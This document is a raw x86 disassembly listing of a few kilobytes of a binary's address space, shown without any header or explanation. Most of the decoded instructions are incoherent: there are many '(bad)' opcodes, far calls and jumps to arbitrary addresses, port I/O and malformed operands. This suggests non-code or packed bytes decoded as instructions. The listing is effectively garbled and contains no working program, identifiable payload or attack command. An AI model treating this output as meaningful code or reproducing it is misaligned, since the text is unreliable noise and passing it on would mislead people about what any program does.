  4078df:	loop   0x4078de
  4078e1:	(bad)  
  4078e2:	sbb    esi,ebp
  4078e4:	dec    ebx
  4078e5:	imul   edi,edi,0x5c
  4078e8:	mov    edx,0x4254ffab
  4078ed:	xor    eax,DWORD PTR [ebx]
  4078ef:	xlat   BYTE PTR ds:[ebx]
  4078f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078f1:	inc    eax
  4078f2:	mov    esi,DWORD PTR [ecx+0x0]
	...
  40791c:	add    BYTE PTR [eax],al
  40791e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40791f:	(bad)  
  407920:	cld    
  407921:	shr    DWORD PTR [edi+0x16],1
  407924:	add    cl,ch
  407926:	aam    0xc6
  407928:	or     al,0xc1
  40792a:	outs   dx,DWORD PTR ds:[esi]
  40792b:	daa    
  40792c:	jmp    FWORD PTR [esi-0x4fa4e34f]
  407932:	or     BYTE PTR [edi+0x0],0x34
  407936:	shr    DWORD PTR [edi],0x81
  407939:	lods   eax,DWORD PTR ds:[esi]
  40793a:	xor    al,BYTE PTR [ecx-0x1]
  40793d:	mov    ?,WORD PTR [edi-0x3eff8e2a]
  407943:	in     al,0xfe
  407945:	push   eax
  407946:	dec    edi
  407947:	push   esi
  407948:	add    DWORD PTR [eax],eax
  40794a:	push   edi
  40794b:	hlt    
  40794c:	pop    ss
  40794d:	(bad)  
  40794e:	push   edi
  40794f:	pop    esp
  407950:	leave  
  407951:	ret    
  407952:	call   0x54:0x7283ebd1
  407959:	je     0x4079ab
  40795b:	fnstcw WORD PTR [eax+edx*1+0x57]
  40795f:	push   eax
  407960:	sbb    edi,edi
  407962:	cli    
  407963:	das    
  407964:	(bad)  
  407965:	jne    0x407996
  407967:	hlt    
  407968:	(bad)  
  40796a:	jo     0x407950
  40796c:	(bad)  
  40796d:	jne    0x407976
  40796f:	in     eax,0x74
  407971:	or     al,0x60
  407973:	push   0x8
  407975:	call   0x3f8692
  40797a:	pop    esi
  40797b:	sbb    DWORD PTR [eax],edx
  40797d:	add    dl,cl
  40797f:	shr    bl,1
  407981:	add    DWORD PTR [eax],0x0
	...
  4079ac:	ret    0x53
  4079af:	je     0x4079c4
  4079b1:	fnstcw WORD PTR [esp+ecx*1-0x29]
  4079b5:	dec    edi
  4079b6:	push   ss
  4079b7:	jmp    FWORD PTR [edx+0x4c]
  4079ba:	(bad)  
  4079bb:	jne    0x40798c
  4079bd:	repz mov dl,0xd6
  4079c0:	lock in al,0xfe
  4079c3:	jne    0x4079a8
  4079c5:	in     al,0x74
  4079c7:	or     bh,bh
  4079c9:	dec    ebp
  4079ca:	xlat   BYTE PTR ds:[ebx]
  4079cb:	inc    DWORD PTR [eax-0x58f33df2]
  4079d1:	mov    cl,BYTE PTR [ebx-0xfffeb14]
  4079d7:	jmp    FWORD PTR [edx+0x53]
  4079da:	call   0xff24fa24
  4079df:	mov    DWORD PTR [edx+0x53],ebx
  4079e2:	cmp    DWORD PTR [ebp+0x3e],0x36
  4079e6:	add    esi,DWORD PTR [eax+ebp*8-0x30]
  4079ea:	(bad)  
  4079ec:	data16 cmp BYTE PTR [ecx-0x3cb38e01],0x74
  4079f4:	cld    
  4079f5:	mov    dh,0x40
  4079f7:	lock push cs
  4079f9:	mov    cl,0x10
  4079fb:	or     al,0x66
  4079fd:	sub    DWORD PTR [edx-0x3cb3ae01],edi
  407a03:	je     0x407a11
  407a05:	mov    bl,0x18
  407a07:	cld    
  407a08:	ds xor dh,bl
  407a0b:	jmp    FWORD PTR [esp+edx*2+0x759b]
	...
  407a3a:	xor    bh,BYTE PTR [esi+0x10]
  407a3d:	clc    
  407a3e:	push   ss
  407a3f:	mov    ah,BYTE PTR [ebp-0x3cc5de01]
  407a45:	jne    0x407a76
  407a47:	jne    0x407a59
  407a49:	adc    BYTE PTR [ecx],dl
  407a4b:	call   0x6cd479e6
  407a50:	call   0xf9ff:0x4a5c3675
  407a57:	push   ebp
  407a58:	mov    BYTE PTR [ebp-0x12],al
  407a5b:	in     al,0xaa
  407a5d:	(bad)  
  407a5e:	or     DWORD PTR [esi-0x67],eax
  407a61:	jmp    FWORD PTR [ebx+0x20]
  407a64:	stos   DWORD PTR es:[edi],eax
  407a65:	xchg   bh,dh
  407a67:	xor    eax,0x30fcc999
  407a6c:	add    edx,DWORD PTR [ebp-0x4b]
  407a6f:	sbb    BYTE PTR [ebp+0xf0dcec4],al
  407a75:	or     al,0xa6
  407a77:	loopne 0x407a32
  407a79:	push   DWORD PTR [ecx-0x42f3c035]
  407a7f:	xchg   DWORD PTR [eax],ecx
  407a81:	add    BYTE PTR [edx],ch
  407a83:	jne    0x407a1e
  407a85:	jne    0x407ad1
  407a87:	pop    ebx
  407a88:	xchg   ecx,eax
  407a89:	inc    esp
  407a8a:	jo     0x407aca
  407a8c:	sahf   
  407a8d:	or     eax,0x86dac77e
  407a92:	sti    
  407a93:	dec    edx
  407a94:	cmp    DWORD PTR [ecx-0x6e6eb10d],ebx
  407a9a:	nop
  407a9b:	ds jle 0x407aab
	...
  407ac6:	add    BYTE PTR [eax],al
  407ac8:	jle    0x407a91
  407aca:	retf   0xe382
  407acd:	ds jmp 0xda9ba8d6
  407ad3:	repnz push eax
  407ad5:	enter  0x98f9,0xd3
  407ad9:	ds push esi
  407adb:	cmovbe edi,DWORD PTR [esi]
  407ade:	aam    0xb
  407ae0:	xor    BYTE PTR es:[edi-0x67],al
  407ae4:	xor    eax,edx
  407ae6:	mov    ds:0xcd338e93,eax
  407aeb:	mov    eax,0xf2e3e21
  407af0:	dec    edx
  407af1:	xor    ecx,ebp
  407af3:	mov    edx,0xc6303e11
  407af8:	cmp    bl,BYTE PTR [ebx-0x44]
  407afb:	mov    WORD PTR [edx],ss
  407afd:	fisub  DWORD PTR [esp+edx*4]
  407b00:	lea    esi,[edx+0x22]
  407b03:	cdq    
  407b04:	imul   edx,DWORD PTR [ebx+0x11],0x29
  407b08:	or     BYTE PTR [esi],bh
  407b0a:	test   BYTE PTR [edx+0x176a537b],0x46
  407b11:	pop    ebx
  407b12:	pop    ebp
  407b13:	inc    edx
  407b14:	rol    edi,1
  407b16:	icebp  
  407b17:	stos   DWORD PTR es:[edi],eax
  407b18:	in     eax,0x1f
  407b1a:	(bad)  
  407b1b:	cwde   
  407b1c:	xor    eax,0xcad6551b
  407b21:	xchg   edi,eax
  407b22:	mov    ecx,0xf1c7b133
  407b27:	stos   DWORD PTR es:[edi],eax
  407b28:	int3   
  407b29:	sbb    al,0x0
  407b2b:	mov    dh,0x0
	...
  407b55:	add    dh,al
  407b57:	push   ecx
  407b58:	shl    BYTE PTR ds:0xa57cdaa0,0x3d
  407b5f:	pop    ebx
  407b60:	adc    cl,ch
  407b62:	xor    ch,BYTE PTR [ebx-0x1]
  407b65:	sbb    al,0xa6
  407b67:	cmp    eax,0x77a59175
  407b6c:	loop   0x407af4
  407b6e:	(bad)  
  407b6f:	push   ecx
  407b70:	shl    ch,0x3c
  407b73:	call   0xe9e8:0xaaca2c8d
  407b7a:	xchg   esi,eax
  407b7b:	cmp    eax,0x534066ff
  407b80:	call   0xff7e00ae
  407b85:	bound  edi,QWORD PTR [edx-0x5f]
  407b88:	leave  
  407b89:	sub    edi,DWORD PTR [ecx]
  407b8b:	cmp    eax,0xdad97254
  407b90:	ret    
  407b91:	jne    0x407b5a
  407b93:	cmp    al,0xff
  407b95:	mov    al,cs:0xb62efe03
  407b9b:	pop    ebx
  407b9c:	add    cl,ch
  407b9e:	cmp    eax,0x3aed44d0
  407ba3:	sbb    esi,DWORD PTR [esp+ebp*8-0x43]
  407ba7:	add    DWORD PTR [eax],0xffffff94
  407baa:	clc    
  407bab:	xor    edi,DWORD PTR [eax-0x18]
  407bae:	cmp    eax,0x4174ff5b
  407bb3:	xor    ebx,ebp
  407bb5:	or     al,dh
  407bb7:	cmp    al,0xb
  407bb9:	sub    DWORD PTR [eax],eax
	...
  407be3:	add    BYTE PTR [eax+0x4c],cl
  407be6:	push   0x9a79b3
  407beb:	fisubr WORD PTR [edi]
  407bed:	dec    edi
  407bee:	call   0xff7d05e5
  407bf3:	ret    0xb347
  407bf6:	iret   
  407bf7:	add    BYTE PTR [eax-0x6a],ch
  407bfa:	add    bh,bh
  407bfc:	jb     0x407c51
  407bfe:	call   0xff25470f
  407c03:	mov    DWORD PTR [edx],esp
  407c05:	lahf   
  407c06:	(bad)  
  407c07:	(bad)  
  407c08:	fsubr  DWORD PTR [edi+0x3e]
  407c0b:	add    DWORD PTR [edi-0x2a7a72a8],edx
  407c11:	in     eax,0xfe
  407c13:	push   DWORD PTR [edi]
  407c15:	out    dx,eax
  407c16:	sbb    eax,0xffffffb8
  407c19:	in     al,0x8c
  407c1b:	test   DWORD PTR [ebp+0x47fffee5],edx
  407c21:	in     al,0xb4
  407c23:	mov    eax,0xe8fee3e9
  407c28:	mov    cl,0x18
  407c2a:	add    BYTE PTR [eax],al
  407c2c:	into   
  407c2d:	fnstcw WORD PTR [ebx+0x3fe3e8fe]
  407c33:	bt     DWORD PTR [ecx+0x0],eax
  407c37:	add    BYTE PTR [edi],ah
  407c39:	rcl    DWORD PTR [edx+eax*8-0x8011b97],cl
  407c40:	adc    eax,0x27ffff48
  407c45:	push   ebp
  407c46:	test   BYTE PTR [ebx+0x0],al
	...
  407c70:	add    BYTE PTR [eax],al
  407c72:	daa    
  407c73:	pop    eax
  407c74:	add    BYTE PTR [ebp+0x684f33d5],cl
  407c7a:	push   edx
  407c7b:	xchg   esp,eax
  407c7c:	inc    ecx
  407c7d:	add    BYTE PTR [edi],bh
  407c7f:	aam    0xc2
  407c81:	add    bh,ah
  407c83:	push   eax
  407c84:	shl    BYTE PTR [ebp-0x1e],0xee
  407c88:	retf   
  407c89:	add    bh,dl
  407c8b:	push   edi
  407c8c:	lea    edx,[ebp-0x11adb]
  407c92:	dec    edx
  407c93:	call   0x414e:0xfc6f502c
  407c9a:	xor    ch,BYTE PTR ds:[ebx+0x3317d72]
  407ca1:	or     edi,DWORD PTR [esi+0x7e]
  407ca4:	add    ecx,ebp
  407ca6:	fnstenv [ecx]
  407ca8:	add    eax,DWORD PTR [eax]
  407caa:	mov    eax,ds:0x57e8087e
  407caf:	adc    DWORD PTR [esi+0xff245ff],edx
  407cb5:	movhps xmm6,QWORD PTR [ebx+ecx*2+0xfe53e41]
  407cbd:	or     al,0x66
  407cbf:	fs mov ebx,0x8e871ff
  407cc5:	push   0x3e
  407cc7:	mov    ebp,0x58560c10
  407ccc:	mov    ebx,0x709e59ff
  407cd1:	ret    0xb450
  407cd4:	xchg   esi,eax
  407cd5:	lea    eax,[eax]
	...
  407cff:	add    ah,ch
  407d01:	dec    ebp
  407d02:	xor    dl,BYTE PTR [eax+0x56]
  407d05:	aam    0xb9
  407d07:	(bad)  
  407d08:	cmp    ebp,esi
  407d0a:	xchg   ebp,eax
  407d0b:	jne    0x407d63
  407d0d:	mov    eax,ds:0xf0291410
  407d12:	repnz dec edi
  407d14:	and    eax,edi
  407d16:	or     ch,al
  407d18:	push   cs
  407d19:	mov    edx,DWORD PTR [esi-0x5156d901]
  407d1f:	dec    DWORD PTR [ecx]
  407d21:	dec    esi
  407d22:	and    ecx,DWORD PTR [ebp-0x7a73df84]
  407d28:	mov    dl,0x6a
  407d2a:	xchg   esi,eax
  407d2b:	(bad)  
  407d2c:	mov    ebp,0x72fff2df
  407d31:	inc    esi
  407d32:	stos   BYTE PTR es:[edi],al
  407d33:	adc    ah,cl
  407d35:	mov    bh,0xf3
  407d37:	(bad)  
  407d38:	xchg   ebx,eax
  407d39:	jo     0x407cd0
  407d3b:	call   ecx
  407d3d:	pop    ebx
  407d3e:	ror    DWORD PTR [ebp+0x8e95bfd],1
  407d44:	(bad)  
  407d45:	scas   eax,DWORD PTR es:[edi]
  407d46:	adc    al,0x2c
  407d48:	shl    BYTE PTR [ebx-0x4f4efbd8],0xf5
  407d4f:	stos   DWORD PTR es:[edi],eax
  407d50:	dec    edi
  407d51:	push   ss
  407d52:	mov    esi,0x7cf0a195
  407d57:	xchg   esi,eax
  407d58:	cdq    
  407d59:	cmp    bl,BYTE PTR [ecx]
  407d5b:	lods   al,BYTE PTR ds:[esi]
  407d5c:	not    DWORD PTR ds:0xddee95a6
  407d62:	sbb    edi,esp
	...
  407d8c:	add    BYTE PTR [eax],al
  407d8e:	sub    DWORD PTR [esi+0x4ef394e5],0x62eb9539
  407d98:	xchg   BYTE PTR [edi],ch
  407d9a:	inc    esi
  407d9b:	inc    esi
  407d9c:	in     eax,dx
  407d9d:	xchg   esp,eax
  407d9e:	jmp    0x407dee
  407da0:	sbb    DWORD PTR [ebp+0x308162d3],edx
  407da6:	push   ebx
  407da7:	cmp    ah,BYTE PTR [esi-0x54]
  407daa:	cld    
  407dab:	adc    DWORD PTR [esi-0x6b],ebx
  407dae:	mov    bl,0xe0
  407db0:	sub    dl,BYTE PTR [esi-0x6b46c5c7]
  407db6:	jmp    0x407dae
  407db8:	inc    esi
  407db9:	xchg   ebp,eax
  407dba:	sub    DWORD PTR [ebx-0x71],eax
  407dbd:	ret    0x5b3e
  407dc0:	ins    BYTE PTR es:[edi],dx
  407dc1:	les    ecx,FWORD PTR [ecx-0x20]
  407dc4:	aaa    
  407dc5:	xchg   esi,eax
  407dc6:	adc    DWORD PTR [edx],edi
  407dc8:	es dec edi
  407dca:	retf   0x1e38
  407dcd:	xchg   ebp,eax
  407dce:	push   ss
  407dcf:	cld    
  407dd0:	sub    al,BYTE PTR [esi+edi*1]
  407dd3:	cmp    dl,BYTE PTR [esp+ebx*2-0x10]
  407dd7:	cmp    DWORD PTR [esi],eax
  407dd9:	lods   al,BYTE PTR ds:[esi]
  407dda:	dec    esp
  407ddb:	adc    bh,dh
  407ddd:	xchg   esp,eax
  407dde:	neg    DWORD PTR [eax+eax*1]
  407de1:	fnstsw WORD PTR ds:0x27fd8b90
  407de7:	pop    ebx
  407de8:	call   FWORD PTR [esi+ecx*8+0x38]
  407dec:	jne    0x407de7
  407dee:	stos   BYTE PTR es:[edi],al
  407def:	scas   eax,DWORD PTR es:[edi]
  407df0:	or     al,0xd6
	...
  407e1a:	add    BYTE PTR [eax],al
  407e1c:	dec    eax
  407e1d:	arpl   ax,bp
  407e1f:	push   cs
  407e20:	enter  0xff39,0xb0
  407e24:	jg     0x407e70
  407e26:	add    BYTE PTR [edi+esi*4],dl
  407e29:	inc    esi
  407e2a:	(bad)  
  407e2b:	cmp    al,0x46
  407e2d:	inc    ebx
  407e2e:	inc    ecx
  407e2f:	xchg   edx,eax
  407e30:	stos   BYTE PTR es:[edi],al
  407e31:	cmp    DWORD PTR [ebx],ecx
  407e33:	test   eax,0x14ff5939
  407e38:	mov    ch,BYTE PTR [ecx+0x39b7a6e8]
  407e3e:	(bad)  
  407e3f:	cmp    ebx,ecx
  407e41:	scas   eax,DWORD PTR es:[edi]
  407e42:	sbb    BYTE PTR [esi+0x7e504f38],al
  407e48:	xor    BYTE PTR [ebx-0x18],ah
  407e4b:	aaa    
  407e4c:	mov    dl,0x39
  407e4e:	inc    DWORD PTR [ecx+0x66ff1092]
  407e54:	je     0x407e72
  407e56:	adc    al,0xe9
  407e58:	adc    dh,ah
  407e5a:	jmp    0x407eb2
  407e5c:	dec    eax
  407e5d:	dec    edi
  407e5e:	call   esp
  407e60:	sub    eax,0x57f5753a
  407e65:	push   ebp
  407e66:	push   DWORD PTR [ebp+esi*1-0x4dc946bd]
  407e6d:	cmp    bh,bh
  407e6f:	mov    ah,0x21
  407e71:	cmp    dh,BYTE PTR [ebp-0x7]
  407e74:	mov    dl,0xae
  407e76:	or     al,0x93
  407e78:	push   ds
  407e79:	cmp    dh,BYTE PTR [ebp-0x1f]
  407e7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e7d:	add    edi,edi
  407e7f:	push   cs
	...
  407ea8:	add    BYTE PTR [eax],al
  407eaa:	retf   0x7538
  407ead:	add    BYTE PTR [ebx],cl
  407eaf:	shl    BYTE PTR [eax+edx*1-0x20],1
  407eb3:	data16 or al,0x6a
  407eb6:	repz iret 
  407eb8:	je     0x407ec2
  407eba:	aas    
  407ebb:	stos   DWORD PTR es:[edi],eax
  407ebc:	(bad)  
  407ebd:	jmp    eax
  407ebf:	test   cl,0x10
  407ec2:	xlat   BYTE PTR ds:[ebx]
  407ec3:	jae    0x407e50
  407ec5:	in     al,dx
  407ec6:	and    al,0x23
  407ec8:	lock push ebx
  407eca:	imul   esi,DWORD PTR [ebx+ebp*1-0x25],0xff0ca22c
  407ed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ed3:	fld    QWORD PTR [eax+edi*8-0x30]
  407ed7:	push   edx
  407ed8:	or     BYTE PTR [edi+0x45c6cb5a],cl
  407ede:	stos   DWORD PTR es:[edi],eax
  407edf:	pop    edi
  407ee0:	add    BYTE PTR [eax],al
  407ee2:	xchg   edi,eax
  407ee3:	loope  0x407f21
  407ee5:	test   BYTE PTR [esi+ebx*4],bl
  407ee8:	add    BYTE PTR [eax],al
  407eea:	dec    ebx
  407eeb:	imul   eax,DWORD PTR [ebx+0x745c6f7d],0x56
  407ef2:	shl    BYTE PTR [ecx+0x5e3d50f0],cl
  407ef8:	push   0x0
  407efa:	cmp    eax,0x477d835f
  407eff:	pop    esp
  407f00:	je     0x407f07
  407f02:	loopne 0x407f55
  407f04:	adc    bl,ch
  407f06:	and    eax,0x276a0056
  407f0b:	fild   DWORD PTR [eax+edi*8+0x0]
	...
  407f37:	add    bh,al
  407f39:	int3   
  407f3a:	adc    al,0x84
  407f3c:	in     al,dx
  407f3d:	sahf   
  407f3e:	add    BYTE PTR [ebx],cl
  407f40:	addr16 push ebx
  407f42:	das    
  407f43:	and    edx,0xffffffcf
  407f46:	push   DWORD PTR [ebx-0x12]
  407f49:	mov    eax,0x9a8c0c45
  407f4e:	lock cmp edi,DWORD PTR [esi]
  407f51:	cmp    bl,BYTE PTR [edx]
  407f53:	pop    ss
  407f54:	jge    0x407fbc
  407f56:	jg     0x407fcd
  407f58:	repnz lods al,BYTE PTR ds:[esi]
  407f5a:	adc    DWORD PTR [eax],ecx
  407f5c:	mov    ch,0x6
  407f5e:	xchg   ebx,eax
  407f5f:	jecxz  0x407f9d
  407f61:	xor    eax,0x167b8b67
  407f66:	xchg   edx,eax
  407f67:	jne    0x407f37
  407f69:	mov    al,0x3
  407f6b:	dec    DWORD PTR [ebx+0xe]
  407f6e:	fwait
  407f6f:	out    0x7e,al
  407f71:	inc    ecx
  407f72:	add    ecx,DWORD PTR [ebx+0x5b32887d]
  407f78:	ja     0x407f7d
  407f7a:	(bad)  
  407f7b:	dec    DWORD PTR [edx]
  407f7d:	lods   eax,DWORD PTR ds:[esi]
  407f7e:	lahf   
  407f7f:	add    DWORD PTR [edx-0x16a9ca13],0xffffff99
  407f86:	repz dec edi
  407f88:	inc    DWORD PTR [ecx-0x65]
  407f8b:	ins    BYTE PTR es:[edi],dx
  407f8c:	jg     0x407fcf
  407f8e:	add    ecx,DWORD PTR [ebx-0x3b7f76a]
  407f94:	ds inc edx
  407f96:	add    eax,DWORD PTR [eax]
  407f98:	xor    eax,0x3e1702
	...
  407fc5:	add    dh,dl
  407fc7:	sub    al,0x33
  407fc9:	inc    ecx
  407fca:	ds push ebp
  407fcc:	pushf  
  407fcd:	hlt    
  407fce:	jle    0x408011
  407fd0:	add    ecx,DWORD PTR [ebx]
  407fd2:	jle    0x407fe9
  407fd4:	loop   0x407f60
  407fd6:	dec    esi
  407fd7:	or     edi,ebx
  407fd9:	dec    edi
  407fda:	jg     0x408020
  407fdc:	ss call 0x4404ff
  407fe2:	xor    eax,0xb51e1784
  407fe7:	pushf  
  407fe8:	add    BYTE PTR [ebp+0x1a],0xd5
  407fec:	call   0x950:0x344feec
  407ff3:	pop    esp
  407ff4:	xchg   BYTE PTR ds:[ebx+0x4417e937],al
  407ffb:	repz out 0x3,eax
  407ffe:	ds pop ebx
  408000:	scas   al,BYTE PTR es:[edi]
  408001:	xor    DWORD PTR [ebp+0x3e4b2a24],eax
  408007:	pop    ebx
  408008:	jmp    0x92d5f910
  40800d:	mov    esp,0x9f6290fd
  408012:	mov    ebp,0x385d91f
  408017:	fwait
  408018:	xor    al,BYTE PTR [ebx+0x3e]
  40801b:	pop    ebx
  40801c:	pop    ebp
  40801d:	idiv   BYTE PTR [eax+edi*2+0x5aff3d25]
  408024:	jmp    0xfc1ab740
  408029:	cmp    eax,DWORD PTR [eax]
	...
  408053:	add    BYTE PTR ds:0xb03e99c,al
  408059:	pop    esi
  40805a:	jno    0x40805f
  40805c:	ds pop ebx
  40805e:	jmp    0x2428fe1d
  408063:	mov    es,WORD PTR [eax-0x13616a5]
  408069:	pop    ebx
  40806a:	jmp    0xe9997f38
  40806f:	leave  
  408070:	(bad)  
  408071:	pop    ecx
  408072:	jmp    0xe99f7f40
  408077:	leave  
  408078:	(bad)  
  408079:	pop    edi
  40807a:	in     al,0x7e
  40807c:	add    ebp,DWORD PTR [edi]
  40807e:	mov    ecx,0xe9c13e1d
  408083:	sbb    eax,0x1de9c13e
  408088:	ds shr ecx,0x1b
  40808c:	pop    esi
  40808d:	pop    ecx
  40808e:	jmp    0xd3bc1496
  408093:	add    eax,0x33009fcb
  408098:	dec    edx
  408099:	ss adc eax,0x9c4aa9
  40809f:	repnz std 
  4080a1:	scas   eax,DWORD PTR es:[edi]
  4080a2:	add    dh,BYTE PTR [eax]
  4080a4:	add    ebx,DWORD PTR [esi]
  4080a6:	inc    ebp
  4080a7:	sbb    DWORD PTR [edx],edi
  4080a9:	pop    ebx
  4080aa:	add    cl,ch
  4080ac:	push   0xce99f0a0
  4080b1:	scas   eax,DWORD PTR es:[edi]
  4080b2:	hlt    
  4080b3:	xchg   ebx,eax
  4080b4:	cmp    eax,0xad1536
	...
  4080e1:	add    BYTE PTR [edx],dl
  4080e3:	pushf  
  4080e4:	add    dl,ah
  4080e6:	std    
  4080e7:	scas   eax,DWORD PTR es:[edi]
  4080e8:	pop    es
  4080e9:	scas   al,BYTE PTR es:[edi]
  4080ea:	js     0x408117
  4080ec:	add    cl,ch
  4080ee:	cmp    eax,0xd65cff5b
  4080f3:	xor    eax,0x9c6b2115
  4080f8:	add    BYTE PTR [edx-0x8],dh
  4080fb:	sub    cl,cl
  4080fd:	stos   BYTE PTR es:[edi],al
  4080fe:	push   eax
  4080ff:	loop   0x4080ec
  408101:	push   0x79
  408103:	loop   0x408091
  408105:	and    al,0xa
  408107:	mov    ebp,DWORD PTR [eax-0x46]
  40810a:	(bad)  
  40810b:	fwait
  40810c:	add    BYTE PTR [ecx-0x6900c6b8],dl
  408112:	sub    eax,0x3415c062
  408117:	fidivr DWORD PTR [ecx+esi*2+0x69]
  40811b:	lods   al,BYTE PTR ds:[esi]
  40811c:	imul   ebp,DWORD PTR [eax+eax*1+0x2b],0x50
  408121:	adc    DWORD PTR [eax-0x3f16ffe6],0x3ec7781a
  40812b:	in     eax,dx
  40812c:	inc    esp
  40812d:	pop    esi
  40812e:	ins    DWORD PTR es:[edi],dx
  40812f:	fs mov dh,0xac
  408132:	iret   
  408133:	mov    ecx,DWORD PTR [edi]
  408135:	xchg   edi,eax
  408136:	xor    BYTE PTR [esi],0x50
  408139:	add    BYTE PTR [eax],ch
  40813b:	xchg   ebx,eax
  40813c:	inc    ebp
  40813d:	cld    
  40813e:	mov    bh,0x5b
  408140:	mov    dh,0x45
  408142:	dec    esp
  408143:	push   0xb60f
	...
  408170:	loop   0x408158
  408172:	dec    edi
  408173:	punpcklwd mm3,DWORD PTR [ebp-0x6d17af07]
  40817a:	inc    ebp
  40817b:	clc    
  40817c:	mov    bh,0x5b
  40817e:	mov    bh,0x45
  408180:	push   ecx
  408181:	push   0xcc92b70f
  408186:	dec    edi
  408187:	call   DWORD PTR [edx-0x38]
  40818a:	fcomp  DWORD PTR [bx+si+0x99]
  40818f:	lea    esp,[edx-0x4617af4c]
  408195:	pop    ds
  408196:	add    BYTE PTR [eax],al
  408198:	and    al,0x23
  40819a:	xor    al,0x8d
  40819c:	(bad)  
  40819d:	fisttp DWORD PTR [edi-0x18]
  4081a0:	dec    ecx
  4081a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081a2:	add    BYTE PTR [eax],al
  4081a4:	inc    edi
  4081a5:	fiadd  DWORD PTR [esp+ecx*4+0x37]
  4081a9:	push   edi
  4081aa:	ror    DWORD PTR [edi+0x66],cl
  4081ad:	pop    edi
  4081ae:	call   0xff24f9a0
  4081b3:	call   0x3f74eb
  4081b8:	scas   al,BYTE PTR es:[edi]
  4081b9:	sbb    BYTE PTR [ebp-0x75],dl
  4081bc:	mov    ebx,0xb82cc3de
  4081c1:	in     al,0xfe
  4081c3:	push   ebx
  4081c4:	inc    eax
  4081c5:	push   ecx
  4081c6:	add    BYTE PTR [edx+0x67],ch
  4081c9:	in     eax,0x74
  4081cb:	or     BYTE PTR [edi-0x27002f28],bh
  4081d1:	mov    ch,0x45
  4081d3:	cld    
	...
  4081fc:	add    BYTE PTR [eax],al
  4081fe:	outs   dx,DWORD PTR ds:[esi]
  4081ff:	pop    edi
  408200:	add    bh,ch
  408202:	(bad)  
  408204:	je     0x40820e
  408206:	ds call 0x9c1c:0xa529d0a0
  40820e:	ds inc edx
  408210:	add    ecx,DWORD PTR [ebp-0x71de3d]
  408216:	adc    edx,edx
  408218:	call   0xbbc7:0x8f84f258
  40821f:	loope  0x4081ae
  408221:	(bad)  
  408222:	stc    
  408223:	mov    ch,0x4
  408225:	add    BYTE PTR [esi],bh
  408227:	mov    edi,0x64e96089
  40822c:	(bad)  
  40822d:	push   eax
  40822e:	(bad)  
  40822f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408230:	dec    edi
  408231:	add    BYTE PTR [esi],bh
  408233:	or     DWORD PTR [ebx+ebp*1+0x7451beec],edi
  40823a:	leave  
  40823b:	inc    esp
  40823c:	mov    gs,ebx
  40823e:	sub    eax,0x32ffcec2
  408243:	aas    
  408244:	dec    ecx
  408245:	add    DWORD PTR [esi],edi
  408247:	inc    edx
  408248:	add    ecx,DWORD PTR [ebx]
  40824a:	mov    WORD PTR [ebp+0x4239c603],cs
  408250:	inc    esi
  408251:	inc    ecx
  408252:	mov    edi,0x3e00831a
  408257:	inc    edx
  408258:	adc    ebp,esp
  40825a:	xor    eax,0x16161702
  40825f:	fiadd  WORD PTR [edx]
	...
  408289:	add    BYTE PTR [eax],al
  40828b:	add    BYTE PTR [esi],bh
  40828d:	(bad)  
  40828e:	mov    BYTE PTR [eax+0x71],ah
  408291:	int3   
  408292:	lea    edx,[eax+0x69]
  408295:	dec    esi
  408296:	cld    
  408297:	out    0xa2,eax
  408299:	ror    DWORD PTR [ebp+0x194565ff],1
  40829f:	add    ah,ah
  4082a1:	inc    ecx
  4082a2:	mov    ?,WORD PTR [ebp+0x36]
  4082a5:	ficomp DWORD PTR [eax+edx*8+0x41]
  4082a9:	pop    edx
  4082aa:	data16 fwait
  4082ac:	or     esi,DWORD PTR [ecx]
  4082ae:	pop    esi
  4082af:	mov    cs,WORD PTR [esi+0x21fbdc32]
  4082b5:	(bad)  
  4082b6:	cmp    DWORD PTR [esi+0x7e9c421],ecx
  4082bc:	ds pop ebx
  4082be:	push   ecx
  4082bf:	(bad)
  4082c2:	ss jl  0x408288
  4082c5:	(bad)  
  4082c6:	mov    es,WORD PTR cs:[ecx]
  4082c9:	les    esp,FWORD PTR [esi]
  4082cb:	add    bh,BYTE PTR [esi]
  4082cd:	pop    ebx
  4082ce:	push   ds
  4082cf:	pop    eax
  4082d0:	xchg   edx,eax
  4082d1:	xor    dl,BYTE PTR [esi]
  4082d3:	mov    ss,WORD PTR [esi+0x5d]
  4082d6:	stc    
  4082d7:	add    edi,DWORD PTR [esi]
  4082d9:	ret    
  4082da:	jmp    0x119bc0e6
  4082df:	call   0x3429de74
  4082e4:	leave  
  4082e5:	call   0x33021176
  4082ea:	out    0x17,al
  4082ec:	inc    esi
  4082ed:	inc    ebx
  4082ee:	inc    esi
  4082ef:	mov    ah,0x0
	...
  408319:	add    BYTE PTR [ecx+0x3d8d4132],dh
  40831f:	pop    ebx
  408320:	jmp    0xc6d06eb1
  408325:	lea    ebx,[ecx-0x6e0c173d]
  40832b:	xor    al,BYTE PTR [ecx+0x4]
  40832e:	inc    edx
  40832f:	pop    ebx
  408330:	jmp    0xe93205d0
  408335:	add    ecx,DWORD PTR [esi]
  408337:	xor    dl,BYTE PTR [eax+esi*1+0x71]
  40833b:	xor    dl,BYTE PTR [esi-0x7e9d0c73]
  408341:	into   
  408342:	jno    0x408376
  408344:	xchg   BYTE PTR [ebx+eax*4-0x117281d0],bl
  40834b:	xor    DWORD PTR [eax],eax
  40834d:	cld    
  40834e:	inc    ebp
  40834f:	cmp    bh,dl
  408351:	sahf   
  408352:	mov    bl,0x32
  408354:	call   0xff724f11
  408359:	ins    BYTE PTR es:[edi],dx
  40835a:	mov    ecx,0xbb56ff92
  40835f:	mov    ch,BYTE PTR [eax+0x3a]
  408362:	arpl   WORD PTR [eax+eax*1-0xc532af],bx
  408369:	ds xchg ebp,eax
  40836b:	fcom   DWORD PTR [ebx+0x36]
  40836e:	mov    ebx,0x466c8331
  408373:	xor    bh,bh
  408375:	es inc edx
  408377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408378:	inc    ebp
  408379:	push   0xffffff81
  40837b:	xchg   ebx,eax
  40837c:	call   DWORD PTR [esi]
	...
  4083a6:	add    BYTE PTR [eax],al
  4083a8:	mov    ebx,0xbecd7246
  4083ad:	xlat   BYTE PTR ds:[ebx]
  4083ae:	push   edi
  4083af:	push   es
  4083b0:	retf   
